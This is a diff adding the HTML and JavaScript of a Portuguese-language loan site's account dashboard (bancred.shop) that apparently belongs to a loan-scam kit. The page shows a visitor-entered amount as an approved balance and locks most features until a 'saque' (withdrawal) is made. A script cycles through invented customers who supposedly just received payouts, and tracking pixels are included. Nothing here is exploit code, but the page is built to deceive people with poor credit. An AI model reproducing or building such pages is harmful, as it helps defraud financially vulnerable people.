@@ -1,0 +1,435 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta name="csrf-token" content="yIX2qmMM0ynnQvMkuoYu5dIsCBXnKy4x8iGbL7AW">
+    <title>Empréstimo Seguro - Receba hoje via PIX</title>
+    <meta name="description" content="Empréstimo online rápido e seguro. Mesmo com nome sujo ou score baixo. 100% digital, sem taxa.">
+    <meta name="keywords" content="emprestimo, fácil, nome sujo, pix">
+    <meta name="author" content="Bancred">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#FFFFFF">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#FFFFFF">
+    <meta name="msapplication-navbutton-color" content="#FFFFFF">
+    <link rel="canonical" href="https://bancred.shop">
+    <meta property="og:image" content="https://bancred.shop/public/images/banner.jpg">
+    <meta property="og:title" content="Empréstimo Seguro - Receba hoje via PIX">
+    <meta property="og:url" content="https://bancred.shop">
+    <meta property="og:site_name" content="Empréstimo Seguro - Receba hoje via PIX">
+    <meta property="og:type" content="website">
+    <meta property="og:description" content="Empréstimo online rápido e seguro. Mesmo com nome sujo ou score baixo. 100% digital, sem taxa.">
+    <link rel="shortcut icon" href="public/images/favicon-9.ico">
+    <link rel="shortcut icon" href="public/images/favicon-9.ico">
+    <link rel="icon" href="public/images/favicon-9.ico" sizes="32x32">
+    <link rel="icon" href="public/images/favicon-9.ico" sizes="192x192">
+    <link rel="apple-touch-icon" href="public/images/favicon-9.ico">
+    <meta name="msapplication-TileImage" content="https://bancred.shop/public/images/favicon.ico">
+    <link rel="stylesheet" href="public/build/assets/app-DUxc7Kjs.css">
+    <script type="module" src="public/build/assets/app-CAiCLEjY.js"></script>
+    <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+    body, html{font-family: "Inter", sans-serif;} button{cursor:pointer;}
+    </style>
+    <script>
+        window.pixelId = "6938cbd059dd67439a0a0a4d";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <script
+      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+      data-utmify-prevent-xcod-sck
+      data-utmify-prevent-subids
+      async
+      defer
+    ></script>
+    <script>
+        (function() {
+            const params = new URLSearchParams(window.location.search);
+            const utmParams = {};
+            params.forEach((value, key) => {
+                const keyLower = key.toLowerCase();
+                if (keyLower.startsWith('utm_') || keyLower === 'gclid' || keyLower === 'fbclid' || keyLower === 'ref' || keyLower === 'source') {
+                    utmParams[key] = value;
+                }
+            });
+            if (Object.keys(utmParams).length > 0 || window.location.search) {
+                sessionStorage.setItem('utmParams', JSON.stringify(utmParams));
+                sessionStorage.setItem('trackingParams', window.location.search);
+                console.log('✅ UTMs capturadas:', utmParams);
+            }
+        })();
+    </script>
+</head>
+<body data-id="6936f1d964e99">
+    <div class="min-h-screen bg-gray-50 pb-24">
+    <div id="notificationToast" class="fixed left-1/2 top-20 z-50 hidden -translate-x-1/2 animate-in slide-in-from-top duration-300">
+        <div class="rounded-lg bg-orange-500 px-6 py-3 text-sm text-white shadow-lg">
+            Para liberar esta funcionalidade, efetue primeiro o seu saque
+        </div>
+    </div>
+    <div class="bg-blue-600 py-6 px-4 md:px-6 md:pb-8 md:pt-12">
+        <div class="max-w-6xl mx-auto">
+            <div class="mb-4 md:mb-6 flex items-start justify-between">
+                <button class="rounded-full bg-blue-500 flex items-center justify-center w-10 h-10 md:w-12 md:h-12 p-0 md:p-3" style="min-height: 40px;" id="5de74708-c08a-e53f-72de-0668f2930e19">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-user w-5 h-5 md:h-6 md:w-6 text-white"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+                </button>
+                <div class="flex gap-3">
+                    <button class="rounded-full bg-blue-500 flex items-center justify-center w-10 h-10 md:w-12 md:h-12 p-0 md:p-3" style="min-height: 40px;" id="91e063ed-d221-cda9-a72d-96fcdb6efeef" onclick="toggleBalanceVisibility()">
+                        <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-eye w-5 h-5 md:h-6 md:w-6 text-white"><path d="M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0"></path><circle cx="12" cy="12" r="3"></circle></svg>
+                    </button>
+                    <button class="rounded-full bg-blue-500 flex items-center justify-center w-10 h-10 md:w-12 md:h-12 p-0 md:p-3" style="min-height: 40px;" id="61f517ee-f7da-02b4-f520-059a2967c22d"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-shield w-5 h-5 md:h-6 md:w-6 text-white"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path></svg></button>
+                </div>
+            </div>
+            <h1 class="mb-4 md:mb-6 text-2xl md:text-3xl font-semibold text-white">Olá, <span id="userName"></span></h1>
+            <div class="mb-2"><p class="text-sm text-blue-100">Saldo em conta</p>
+            <p class="text-3xl md:text-4xl font-bold text-white" id="loanAmount"></p>
+        </div>
+        <p class="flex items-center gap-1 text-sm text-green-300">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-trending-up h-4 w-4"><polyline points="22 7 13.5 15.5 8.5 10.5 2 17"></polyline><polyline points="16 7 22 7 22 13"></polyline></svg>
+            rendendo 102% do CDI</p>
+        </div>
+    </div>
+    <div class="grid grid-cols-4 gap-4 px-6 py-6 max-w-6xl mx-auto">
+        <button class="flex flex-col items-center gap-2" id="fa605f18-54e1-f38b-55c1-750e1f089ea7" onclick="goToSacar()">
+            <div class="flex w-12 h-12 md:h-16 md:w-16 items-center justify-center rounded-2xl bg-gray-200">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-up-right h-7 w-7 text-gray-700"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg>
+            </div>
+            <span class="text-center text-xs text-gray-700">Sacar agora</span>
+        </button>
+        <button class="flex flex-col items-center gap-2" id="9544d58d-a566-37d4-b94c-a63d5facdfce" onclick="goToPix()">
+            <div class="flex w-12 h-12 md:h-16 md:w-16 items-center justify-center rounded-2xl bg-gray-200">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-qr-code h-7 w-7 text-gray-700"><rect width="5" height="5" x="3" y="3" rx="1"></rect><rect width="5" height="5" x="16" y="3" rx="1"></rect><rect width="5" height="5" x="3" y="16" rx="1"></rect><path d="M21 16h-3a2 2 0 0 0-2 2v3"></path><path d="M21 21v.01"></path><path d="M12 7v3a2 2 0 0 1-2 2H7"></path><path d="M3 12h.01"></path><path d="M12 3h.01"></path><path d="M12 16v.01"></path><path d="M16 12h1"></path><path d="M21 12v.01"></path><path d="M12 21v-1"></path></svg>
+            </div>
+            <span class="text-center text-xs text-gray-700">PIX</span>
+        </button>
+        <button class="flex flex-col items-center gap-2" id="fd7e3535-3a3c-290b-311b-70453a7da5bc" onclick="lockedFeature()">
+            <div class="flex w-12 h-12 md:h-16 md:w-16 items-center justify-center rounded-2xl bg-gray-200">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-scan h-7 w-7 text-gray-700"><path d="M3 7V5a2 2 0 0 1 2-2h2"></path><path d="M17 3h2a2 2 0 0 1 2 2v2"></path><path d="M21 17v2a2 2 0 0 1-2 2h-2"></path><path d="M7 21H5a2 2 0 0 1-2-2v-2"></path></svg>
+            </div>
+            <span class="text-center text-xs text-gray-700">Pagar boleto</span>
+        </button>
+        <button class="flex flex-col items-center gap-2" id="c2ad60ab-f027-16de-0f2e-1f14578d997c" onclick="lockedFeature()">
+            <div class="flex w-12 h-12 md:h-16 md:w-16 items-center justify-center rounded-2xl bg-gray-200">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-piggy-bank h-7 w-7 text-gray-700"><path d="M19 5c-1.5 0-2.8 1.4-3 2-3.5-1.5-11-.3-11 5 0 1.8 0 3 2 4.5V20h4v-2h3v2h4v-4c1-.5 1.7-1 2-2h2v-4h-2c0-1-.5-1.5-1-2V5z"></path><path d="M2 9v1c0 1.1.9 2 2 2h1"></path><path d="M16 11h.01"></path></svg>
+            </div>
+            <span class="text-center text-xs text-gray-700">Cofrinhos</span>
+        </button>
+    </div>
+    <div class="max-w-6xl mx-auto mb-6 rounded-3xl bg-blue-50 p-6">
+        <div class="mb-6 flex items-start justify-between">
+            <div>
+                <h2 class="mb-2 text-xl font-semibold text-gray-900">Seu Empréstimo</h2>
+                <p class="mb-1 text-sm text-gray-600">Valor disponível:</p>
+                <p class="text-2xl font-bold text-gray-900" id="loanAmount2"></p>
+            </div>
+            <button class="flex items-center justify-center gap-1 text-white rounded-full bg-blue-600 text-sm w-24 h-10" onclick="goToSacar()">
+                <span class="font-semibold mb-[2px]">Sacar</span>
+                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-move-right-icon lucide-move-right mt-[2px]"><path d="M18 8L22 12L18 16"></path><path d="M2 12H22"></path></svg>
+            </button>
+        </div>
+        <div class="border-t border-blue-100 pt-4">
+            <div class="flex items-center justify-between">
+                <span class="text-sm text-gray-600">Próximo vencimento:</span>
+                <span class="text-sm font-semibold text-gray-900" id="nextPayment"></span>
+            </div>
+        </div>
+    </div>                  
+    <div class="max-w-6xl mx-auto">
+        <button class="mb-4 flex w-full items-center justify-between rounded-3xl bg-white p-3 md:p-6 shadow-sm transition-shadow hover:shadow-md" id="86696ce8-5f2b-9c3e-d1b8-5527e83c1bf9" onclick="lockedFeature()">
+            <div class="flex items-center gap-4">
+                <div class="rounded-2xl bg-gray-100 p-3">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-credit-card h-6 w-6 text-gray-700"><rect width="20" height="14" x="2" y="5" rx="2"></rect><line x1="2" x2="22" y1="10" y2="10"></line></svg>
+                </div>
+                <div class="text-left">
+                    <h3 class="mb-1 font-semibold text-gray-900">Cartões</h3>
+                    <p class="text-sm text-gray-600">Cartão de crédito sem anuidade com limite pré-aprovado.</p>
+                </div>
+            </div>
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-up-right h-5 w-5 text-gray-400"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg>
+        </button>
+        <button class="mb-4 flex w-full items-center justify-between rounded-3xl bg-white p-3 md:p-6 shadow-sm transition-shadow hover:shadow-md" id="6c10ab41-028a-fb74-8135-9b1ff2c1539b" onclick="goToEmprestimos()">
+            <div class="flex items-center gap-4">
+                <div class="rounded-2xl bg-gray-100 p-3">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-percent h-6 w-6 text-gray-700"><line x1="19" x2="5" y1="5" y2="19"></line><circle cx="6.5" cy="6.5" r="2.5"></circle><circle cx="17.5" cy="17.5" r="2.5"></circle></svg>
+                </div>
+                <div class="text-left">
+                    <h3 class="mb-1 font-semibold text-gray-900">Empréstimos</h3>
+                    <p class="text-sm text-gray-600">Gerencie ou solicite novos valores</p>
+                </div>
+            </div>
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-up-right h-5 w-5 text-gray-400"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg>
+        </button>
+        <button class="mb-4 flex w-full items-center justify-between rounded-3xl bg-white p-3 md:p-6 shadow-sm transition-shadow hover:shadow-md" id="fb58b4ad-54fe-d446-88d5-e4414087ba7f" onclick="goToInvestimentos()">
+            <div class="flex items-center gap-4">
+                <div class="rounded-2xl bg-gray-100 p-3">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-trending-up h-6 w-6 text-gray-700"><polyline points="22 7 13.5 15.5 8.5 10.5 2 17"></polyline><polyline points="16 7 22 7 22 13"></polyline></svg>
+                </div>
+                <div class="text-left">
+                    <h3 class="mb-1 font-semibold text-gray-900">Investimentos</h3>
+                    <p class="text-sm text-gray-600">Faça seu dinheiro render com 100% do CDI.</p>
+                </div>
+            </div>
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-up-right h-5 w-5 text-gray-400"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg>
+        </button>
+    </div>
+    <div class="fixed bottom-0 left-0 right-0 border-t border-gray-200 bg-white px-6 py-4">
+    <div class="flex items-center justify-between max-w-6xl mx-auto">
+        <button class="flex flex-col items-center gap-1 w-[90px]" id="5b08bbe0-24dc-760b-46b5-e12eb708d09c" onclick="goToHome()">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-house h-6 w-6 text-blue-600"><path d="M15 21v-8a1 1 0 0 0-1-1h-4a1 1 0 0 0-1 1v8"></path><path d="M3 10a2 2 0 0 1 .709-1.528l7-5.999a2 2 0 0 1 2.582 0l7 5.999A2 2 0 0 1 21 10v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path></svg>
+            <span class="text-xs font-medium text-blue-600">Home</span>
+        </button>
+        <button class="flex flex-col items-center gap-1 w-[90px]" id="89e9f154-3ddb-71c7-f5da-4bd13613ea1a" onclick="goToSacar()">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-down h-6 w-6 text-gray-400"><path d="M12 5v14"></path><path d="m19 12-7 7-7-7"></path></svg>
+            <span class="text-xs text-gray-600">Saque</span>
+        </button>
+        <button class="flex flex-col items-center gap-1 w-[90px]" id="b1ec4cc1-5d8a-2b71-aa98-31ca5afdc03f" onclick="lockedFeature()">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-user h-6 w-6 text-gray-400"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+            <span class="text-xs text-gray-600">Meus Dados</span>
+        </button>
+    </div>
+</div>;
+</div>
+    <div class="fixed bottom-6 left-6 z-50 transition-all duration-500 transform translate-y-full opacity-0" data-testid="live-notification">
+        <div class="bg-white rounded-xl shadow-lg border border-gray-200 p-4 max-w-sm">
+            <div class="flex items-start gap-3">
+                <div class="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-bell h-5 w-5 text-green-600"><path d="M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9"></path><path d="M10.3 21a1.94 1.94 0 0 0 3.4 0"></path></svg>
+                </div>
+                <div class="flex-1 min-w-0">
+                    <div class="flex items-baseline gap-1">
+                        <h4 class="font-semibold text-gray-900 text-sm truncate">Beatriz F.</h4>
+                        <span class="text-xs text-gray-500">de Porto Alegre</span>
+                    </div>
+                    <p class="text-sm text-gray-600 mb-2">Recebeu via PIX R$&nbsp;17.420,00</p>
+                    <div class="w-full bg-gray-200 rounded-full h-1.5">
+                        <div class="bg-green-500 h-1.5 rounded-full transition-all duration-100 ease-linear"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+<script src="public/js/jquery.min-9.js"></script>
+<script src="public/js/jquery.mask.min-9.js"></script>
+<script src="npm/alpinejs%403.x.x/dist/cdn.min-9.js" defer=""></script>
+<script>
+    // Função helper para detectar ambiente e construir URLs
+    function getLocalUrl(path) {
+        const isLocal = window.location.hostname === 'localhost' || 
+                      window.location.hostname === '127.0.0.1' ||
+                      window.location.protocol === 'file:';
+        
+        if (isLocal) {
+            const currentPath = window.location.pathname;
+            const basePath = currentPath.substring(0, currentPath.lastIndexOf('/'));
+            const cleanPath = path.startsWith('/') ? path.substring(1) : path;
+            return window.location.origin + basePath + '/' + cleanPath;
+        } else {
+            return "https://bancred.shop" + (path.startsWith('/') ? path : '/' + path);
+        }
+    }
+    
+    const userLogado = sessionStorage.getItem("userData");
+    if (!userLogado) {
+        window.location.href = getLocalUrl('/cpf.html') + window.location.search;
+    }
+    // Variáveis para armazenar valores originais
+    let originalValues = {
+        loanAmount: "",
+        loanAmount2: "",
+        nextPayment: ""
+    };
+
+    let isBalanceVisible = true;
+
+    $(document).ready(function () {
+        const userData = JSON.parse(sessionStorage.getItem("userData") || "{}");
+
+        let userName = (userData?.NOME || userData?.nome || "Usuário").split(" ")[0];
+        let loanAmount = userData?.valorDesejado || 20000;
+        let monthlyPayment = userData?.valorParcela || 469.7;
+        let nextPaymentDate = userData?.proxVencimento || "25/02/2026";
+
+        $("#userName").text(userName);
+
+        const formattedLoanAmount = "R$ " + loanAmount.toLocaleString("pt-BR", {minimumFractionDigits: 2,maximumFractionDigits: 2,});
+        const formattedNextPayment = nextPaymentDate + " - R$ " + monthlyPayment.toLocaleString("pt-BR", {minimumFractionDigits: 2,maximumFractionDigits: 2,});
+
+        // Armazenar valores originais
+        originalValues.loanAmount = formattedLoanAmount;
+        originalValues.loanAmount2 = formattedLoanAmount;
+        originalValues.nextPayment = formattedNextPayment;
+
+        // Exibir valores
+        $("#loanAmount").text(formattedLoanAmount);
+        $("#loanAmount2").text(formattedLoanAmount);
+        $("#nextPayment").text(formattedNextPayment);
+    });
+
+    function toggleBalanceVisibility() {
+        const eyeIcon = document.getElementById('eyeIcon');
+        
+        if (isBalanceVisible) {
+            // Ocultar valores
+            $("#loanAmount").text("R$ ••••••");
+            $("#loanAmount2").text("R$ ••••••");
+            $("#nextPayment").text("••/••/•••• - R$ •••,••");
+            
+            // Trocar ícone para eye-off (olho com linha)
+            eyeIcon.innerHTML = '<path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"></path><path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"></path><path d="M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61"></path><line x1="2" y1="2" x2="22" y2="22"></line>';
+            eyeIcon.setAttribute('class', 'lucide lucide-eye-off w-5 h-5 md:h-6 md:w-6 text-white');
+            
+            isBalanceVisible = false;
+        } else {
+            // Revelar valores
+            $("#loanAmount").text(originalValues.loanAmount);
+            $("#loanAmount2").text(originalValues.loanAmount2);
+            $("#nextPayment").text(originalValues.nextPayment);
+            
+            // Trocar ícone para eye (olho normal)
+            eyeIcon.innerHTML = '<path d="M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0"></path><circle cx="12" cy="12" r="3"></circle>';
+            eyeIcon.setAttribute('class', 'lucide lucide-eye w-5 h-5 md:h-6 md:w-6 text-white');
+            
+            isBalanceVisible = true;
+        }
+    }
+
+    function lockedFeature() {
+        $("#notificationToast").fadeIn(200);
+
+        setTimeout(() => {
+            $("#notificationToast").fadeOut(400);
+        }, 4000);
+    }
+
+    function goToEmprestimos() {
+        const isLocal = window.location.hostname === 'localhost' || 
+                      window.location.hostname === '127.0.0.1' ||
+                      window.location.protocol === 'file:';
+        
+        let urlEmprestimos;
+        
+        if (isLocal) {
+            const currentPath = window.location.pathname;
+            const basePath = currentPath.substring(0, currentPath.lastIndexOf('/'));
+            urlEmprestimos = basePath + '/conta/emprestimos.html';
+        } else {
+            urlEmprestimos = "https://bancred.shop/conta/emprestimos.html";
+        }
+        
+        window.location.href = urlEmprestimos + window.location.search;
+    }
+
+    function goToInvestimentos() {
+        const isLocal = window.location.hostname === 'localhost' || 
+                      window.location.hostname === '127.0.0.1' ||
+                      window.location.protocol === 'file:';
+        
+        let urlInvestimentos;
+        
+        if (isLocal) {
+            const currentPath = window.location.pathname;
+            const basePath = currentPath.substring(0, currentPath.lastIndexOf('/'));
+            urlInvestimentos = basePath + '/conta/investimentos.html';
+        } else {
+            urlInvestimentos = "https://bancred.shop/conta/investimentos.html";
+        }
+        
+        window.location.href = urlInvestimentos + window.location.search;
+    }
+
+    function goToHome() {
+        window.location.href = getLocalUrl('/conta.html') + window.location.search;
+    }
+
+    function goToSacar() {
+        // Detectar se está local ou produção e redirecionar adequadamente
+        const isLocal = window.location.hostname === 'localhost' || 
+                      window.location.hostname === '127.0.0.1' ||
+                      window.location.protocol === 'file:';
+        
+        let urlSaque;
+        
+        if (isLocal) {
+            // Modo local - construir URL baseada no caminho atual
+            const currentPath = window.location.pathname;
+            const basePath = currentPath.substring(0, currentPath.lastIndexOf('/'));
+            urlSaque = window.location.origin + basePath + '/conta/saque.html';
+        } else {
+            // Modo produção - usar URL absoluta
+            urlSaque = "https://bancred.shop/conta/saque.html";
+        }
+        
+        console.log('=== REDIRECIONAMENTO (conta -> saque) ===');
+        console.log('Ambiente Local:', isLocal);
+        console.log('URL de destino:', urlSaque);
+        window.location.href = urlSaque + window.location.search;
+    }
+
+    function goToPix() {
+        // Redirecionar para o mesmo local de saque (conforme solicitado)
+        goToSacar();
+    }
+
+    const notifications = [
+        { name: "Cláudia J.", city: "Goiânia", amount: 17450.00, message: "Recebeu via PIX R$" },
+        { name: "Lucas O.", city: "Curitiba", amount: 19800.00, message: "Conseguiu o crédito de R$" },
+        { name: "Fernanda L.", city: "Porto Alegre", amount: 22100.00, message: "Foi aprovada e recebeu R$" },
+        { name: "Gabriel L.", city: "Manaus", amount: 15600.00, message: "Acabou de receber R$" },
+        { name: "Felipe M.", city: "Guarulhos", amount: 13800.00, message: "Conseguiu o crédito de R$" },
+        { name: "Tatiane P.", city: "Curitiba", amount: 8700.00, message: "Acabou de receber R$" },
+        { name: "Carla S.", city: "Salvador", amount: 21450.00, message: "Foi aprovada e recebeu R$" },
+        { name: "Rogério F.", city: "Belo Horizonte", amount: 9400.00, message: "Recebeu via PIX R$" },
+        { name: "Patrícia M.", city: "Fortaleza", amount: 11800.00, message: "Conseguiu o crédito de R$" },
+        { name: "André R.", city: "São Paulo", amount: 15200.00, message: "Acabou de receber R$" },
+        { name: "Vanessa C.", city: "Brasília", amount: 20500.00, message: "Foi aprovada e recebeu R$" },
+        { name: "João P.", city: "Recife", amount: 9700.00, message: "Recebeu via PIX R$" },
+    ];
+
+    let currentNotification = 0;
+    const container = document.querySelector('[data-testid="live-notification"]');
+    const nameEl = container.querySelector('h4');
+    const cityEl = container.querySelector('span');
+    const amountEl = container.querySelector('p');
+    const progressEl = container.querySelector('.bg-green-500');
+
+    function formatCurrencyNoti(value) {
+        return value.toLocaleString("pt-BR", {
+            minimumFractionDigits: 2,
+            maximumFractionDigits: 2,
+        });
+    }
+
+    function showNotification() {
+        const n = notifications[currentNotification];
+
+        nameEl.textContent = n.name;
+        cityEl.textContent = `de ${n.city}`;
+        amountEl.innerHTML = `${n.message} ${formatCurrencyNoti(n.amount)}`;
+
+        container.classList.remove("translate-y-full", "opacity-0");
+        container.classList.add("translate-y-0", "opacity-100");
+
+        progressEl.style.transition = "none";
+        progressEl.style.width = "100%";
+        void progressEl.offsetWidth;
+
+        progressEl.style.transition = "width 5s linear";
+        progressEl.style.width = "0%";
+
+        setTimeout(() => {
+            container.classList.add("translate-y-full", "opacity-0");
+            container.classList.remove("translate-y-0", "opacity-100");
+        }, 5000);
+
+        currentNotification = (currentNotification + 1) % notifications.length;
+    }
+
+    setTimeout(showNotification, 5000);
+    setInterval(showNotification, 15000);
+</script>
+<script defer="" src="beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015-9" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"b9599e1da994470b9c098e5fca4ee72d","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
